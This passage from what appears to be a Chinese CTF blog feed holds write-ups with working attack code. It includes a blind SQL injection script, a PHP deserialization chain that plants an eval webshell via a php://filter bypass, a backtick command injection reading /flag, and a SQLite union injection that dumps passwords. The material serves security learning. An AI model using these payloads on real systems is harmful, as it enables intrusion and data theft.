class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;) <span class="hljs-comment">#这个代理作用是可以发到bp</span>print(a.text)</code></pre><p>返回了Try again! ，说明可在这里注入，而且没有过滤，接下来就正常的盲注脚本</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://f8623bdf-89da-4fc0-aa78-40b432183998.node3.buuoj.cn/templates/login.php&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;x=<span class="hljs-string">&quot;&quot;</span>database=<span class="hljs-string">&quot;database()&quot;</span><span class="hljs-comment">#p3rh4ps</span>table =<span class="hljs-string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema regexp database())&quot;</span>column=<span class="hljs-string">&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27; and table_schema=database())&quot;</span> <span class="hljs-comment">#flag_tbl,ptbctf</span>data = <span class="hljs-string">&quot;(select group_concat(secret) from flag_tbl)&quot;</span><span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span>    <span class="hljs-built_in">min</span> = <span class="hljs-number">33</span>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">max</span> &gt;= <span class="hljs-built_in">min</span>:        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) // <span class="hljs-number">2</span>        <span class="hljs-comment"># print(mid)</span>        <span class="hljs-comment"># time.sleep(0.5)</span>        r = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin\&quot;or ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;#&#x27;</span>.<span class="hljs-built_in">format</span>(data,Len,mid), <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;)        <span class="hljs-comment"># print(r.text )</span>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Try again!&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text):            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">max</span> = mid        <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span> == mid == <span class="hljs-built_in">min</span>:            x += <span class="hljs-built_in">chr</span>(mid)            print(x)            <span class="hljs-keyword">break</span></code></pre><hr><p>那这个PHP_SESSION_UPLOAD_PROGRESS是怎么绕的呢</p><pre><code class="hljs pgsql">$_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，$_SESSION还不存在。那么，如果我们直接传入<span class="hljs-keyword">SESSION</span>呢？ 🍊 在HITCON <span class="hljs-number">2018</span>的时候出了一道One <span class="hljs-type">line</span> php，其中涉及到一个PHP <span class="hljs-keyword">SESSION</span>的细节：如果在php.ini中设置<span class="hljs-keyword">session</span>.auto_start=<span class="hljs-keyword">On</span>，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是<span class="hljs-keyword">session</span>.auto_start默认为<span class="hljs-keyword">Off</span>。与<span class="hljs-keyword">Session</span>相关的另一个选项叫<span class="hljs-keyword">session</span>.upload_progress.enabled，默认为<span class="hljs-keyword">On</span>，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()。</code></pre><p>参考 <a href="https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/">https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>绕isset($_SESSION)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[EIS 2019]EzPOP延展做法</title>
    <link href="/2020/05/06/EIS-2019-EzPOP%E5%BB%B6%E5%B1%95%E5%81%9A%E6%B3%95/"/>
    <url>/2020/05/06/EIS-2019-EzPOP%E5%BB%B6%E5%B1%95%E5%81%9A%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>给了源码，审计开始 go！go！go！</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;        <span class="hljs-keyword">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;        <span class="hljs-variable">$cachedProperties</span> = array_flip([            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,        ]);        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;            <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$object</span>)) &#123;                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = array_intersect_key(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$cleaned</span> = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);        <span class="hljs-keyword">return</span> json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;            <span class="hljs-keyword">$this</span>-&gt;save();        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;        <span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$data</span>)) &#123;            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;        &#125;        <span class="hljs-variable">$serialize</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];        &#125;        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;            <span class="hljs-keyword">try</span> &#123;                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;                <span class="hljs-comment">// 创建失败</span>            &#125;        &#125;        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;            <span class="hljs-comment">//数据压缩</span>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);        &#125;        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>))&#123;    mkdir(<span class="hljs-variable">$dir</span>);&#125;unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);</code></pre><p>​        我这个最菜web🐕做代码审计题通常都是先整体看看代码的大意逻辑，然后再具体看代码的实现过程。在这里先不看两个A、B类，接下来看便是传入src可以看代码，建一个upload文件夹，还有一个<code>unserialize($_GET[&quot;data&quot;]);</code>,data是我们传入的，可控，基本上就确定是利用反序列化，通过data传入构造的payload。</p><p>​        审计A类有魔术方法<code>__destruct</code>,B类没有魔术方法，但B类里面有<code>file_put_contents</code>可以写文件，这明摆着就可以写webshell了，👴二话不说开始🤔。从<code>__destruct</code>开始搞，咱建一个A类，就叫<code>$a</code>吧，<code>$a</code>走的时候触发<code>__destruct</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;            <span class="hljs-keyword">$this</span>-&gt;save();        &#125;    &#125;</code></pre><p><code>$this-&gt;autosave=false</code>就可以触发<code>save()</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);&#125;</code></pre><p>save里面的<code>$this-&gt;store</code>调用了set,A里面没得set，真巧B里面有set</p><p><code>$this-&gt;store</code>设置为B类，完事，咱跟进B类里面的set</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];        &#125;        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;            <span class="hljs-keyword">try</span> &#123;                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;                <span class="hljs-comment">// 创建失败</span>            &#125;        &#125;        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;            <span class="hljs-comment">//数据压缩</span>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);        &#125;        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>太乱了，👴看不下去了，来倒着推吧，咱利用<code>$result = file_put_contents($filename, $data);</code>写shell。</p><p>先看<code>$filename</code></p><pre><code class="hljs php"><span class="hljs-variable">$name</span> 是咱在save中传过来的也就是 <span class="hljs-keyword">$this</span>-&gt;key<span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;&#125;options数组是B的，可控，<span class="hljs-variable">$name</span>是a中传的key，可控，完事文件名可控总结: 文件名是 <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$key</span></code></pre><p>再看<code>$data</code></p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;            <span class="hljs-comment">//数据压缩</span>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);        &#125;<span class="hljs-comment">#gzcompress根本不存在忽略了，如果不放心可以吧options[&#x27;data_compress&#x27;]=falase</span><span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);serialize是什么鬼，序列化吗不对劲啊，👴看看仔细看定义了个serialize函数，最后实现的是<span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);  <span class="hljs-variable">$serialize</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];  这个函数可控啊，先记下来打个🌟    <span class="hljs-variable">$value</span>就是A中传的 <span class="hljs-variable">$contents</span><span class="hljs-variable">$contents</span>又是什么🌶🐓，哦，原来是json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);<span class="hljs-variable">$cleaned</span>设置成空，就是 <span class="hljs-keyword">$this</span>-&gt;complete 了。总结 <span class="hljs-variable">$data</span> 就是  <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;complete;</code></pre><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>构造完事，根据上面的分析过有</p><pre><code class="hljs php">A：<span class="hljs-variable">$store</span> 指向B<span class="hljs-variable">$key</span>   文件后缀名  指定就 .php<span class="hljs-variable">$expire</span> 没啥用<span class="hljs-keyword">$this</span>-&gt;autosave <span class="hljs-literal">false</span><span class="hljs-keyword">$this</span>-&gt;cache 设为空<span class="hljs-keyword">$this</span>-&gt;complete  🐎B:options[<span class="hljs-string">&#x27;prefix&#x27;</span>]  文件名options[<span class="hljs-string">&#x27;serialize&#x27;</span>] 方法options[<span class="hljs-string">&#x27;expire&#x27;</span>] 没啥用options[<span class="hljs-string">&#x27;data_compress&#x27;</span>]  <span class="hljs-literal">false</span></code></pre><p>构造</p><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();<span class="hljs-variable">$b</span>-&gt;writeTimes = <span class="hljs-number">0</span>;<span class="hljs-variable">$b</span> -&gt; options = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&quot;strtoupper&quot;</span>,                       <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,                      <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&quot;shell&quot;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$store</span> = <span class="hljs-variable">$b</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-number">0</span>);<span class="hljs-variable">$a</span>-&gt;autosave = <span class="hljs-literal">false</span>;<span class="hljs-variable">$a</span>-&gt;cache = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$a</span>-&gt;complete = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre><p>你会发现执行不了，这是为什么呢因为 <code>$data</code>前面拼接了<code>exit()</code>,根本就执行不了。</p><p><img src="https://s1.ax1x.com/2020/05/06/YEDhKH.png" alt="YEDhKH.png"></p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>绕死亡<code>exit()</code>,可以通过伪协议绕过</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();<span class="hljs-variable">$b</span>-&gt;writeTimes = <span class="hljs-number">0</span>;<span class="hljs-variable">$b</span> -&gt; options = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&quot;trim&quot;</span>,    <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=uploads/b&quot;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$store</span> = <span class="hljs-variable">$b</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-number">0</span>);<span class="hljs-variable">$a</span>-&gt;autosave = <span class="hljs-literal">false</span>;<span class="hljs-variable">$a</span>-&gt;cache = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$a</span>-&gt;complete = <span class="hljs-string">&#x27;aaa&#x27;</span>.base64_encode(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;b&quot;]);?&gt;&#x27;</span>);<span class="hljs-comment"># 这里拼接了aaa 是为了base64能正常解码</span><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre><p>🐎就上传到uploads/b.php了密码是b</p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>其他解法</p><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();<span class="hljs-variable">$b</span>-&gt;writeTimes = <span class="hljs-number">0</span>;<span class="hljs-variable">$b</span> -&gt; options = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>,    <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$store</span> = <span class="hljs-variable">$b</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-number">0</span>);<span class="hljs-variable">$a</span>-&gt;autosave = <span class="hljs-literal">false</span>;<span class="hljs-variable">$a</span>-&gt;cache = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$a</span>-&gt;complete = <span class="hljs-string">&#x27;`cat /flag &gt; ./flag.php`&#x27;</span>;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre><p>相当于</p><pre><code class="hljs php">system(<span class="hljs-string">&#x27;[[],&quot;`cat /flag &gt; ./flag.php`&quot;]&#x27;</span>)</code></pre><p>在shell里执行的时候 反引号 的优先级是高于引号的，所以会先执行<code>cat /flag &gt; ./flag.php</code>，flag就被写到flag.php里面去了</p><p><img src="https://s1.ax1x.com/2020/05/06/YERz59.png" alt="YERz59.png"></p><p>如图虽然命令错误，但是任然正常执行了反引号里的命令</p><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>总结： 入门半年的web🐕觉得代码审计真的是太太太难了，当审不下去的时候可以倒过来从可能的利用点思考。还有要多多看大师傅的文章，发现更多的骚操作！！！</p><p><strong>参考</strong></p><p><a href="https://www.zhaoj.in/read-6397.html">https://www.zhaoj.in/read-6397.html</a><br><a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p><p><a href="http://www.rayi.vip/2019/11/27/EIS%202019/">http://www.rayi.vip/2019/11/27/EIS%202019/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs学习</title>
    <link href="/2020/05/05/nodejs%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/05/05/nodejs%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.runoob.com/nodejs/nodejs-http-server.html">https://www.runoob.com/nodejs/nodejs-http-server.html</a></p></blockquote><p>Node.js应用</p><pre><code class="hljs awk">var http = require(<span class="hljs-string">&#x27;http&#x27;</span>);http.createServer(<span class="hljs-keyword">function</span> (request, response) &#123;    <span class="hljs-regexp">//</span> 发送 HTTP 头部     <span class="hljs-regexp">//</span> HTTP 状态值: <span class="hljs-number">200</span> : OK    <span class="hljs-regexp">//</span> 内容类型: text/plain    response.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);    <span class="hljs-regexp">//</span> 发送响应数据 <span class="hljs-string">&quot;Hello World&quot;</span>    response.end(<span class="hljs-string">&#x27;Hello World\n&#x27;</span>);&#125;).listen(<span class="hljs-number">8888</span>);<span class="hljs-regexp">//</span> 终端打印如下信息console.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8888/&#x27;</span>);</code></pre>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>websec刷题</title>
    <link href="/2020/05/05/websec%E5%88%B7%E9%A2%98/"/>
    <url>/2020/05/05/websec%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="level01"><a href="#level01" class="headerlink" title="level01"></a>level01</h1><p>sqli的注入，用到一个sqlite_master系统表</p><pre><code class="hljs sql">对于表来说<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> sqlite_master ( <span class="hljs-keyword">type</span> <span class="hljs-built_in">TEXT</span>,   //<span class="hljs-keyword">table</span><span class="hljs-keyword">name</span> <span class="hljs-built_in">TEXT</span>,   //表名tbl_name <span class="hljs-built_in">TEXT</span>,  //表名rootpage <span class="hljs-built_in">INTEGER</span>, //不清楚<span class="hljs-keyword">sql</span> <span class="hljs-built_in">TEXT</span> //建表语句); 联合注入查一下就可以了-2 union <span class="hljs-keyword">select</span> <span class="hljs-number">5</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">SQL</span>) <span class="hljs-keyword">from</span> sqlite_master)<span class="hljs-comment">-- +</span>得知有<span class="hljs-keyword">password</span>，查一下<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">5</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">-- +</span>UnrelatedPassword,ExampleUserPassword,WEBSEC&#123;Simple_SQLite_Injection&#125;<span 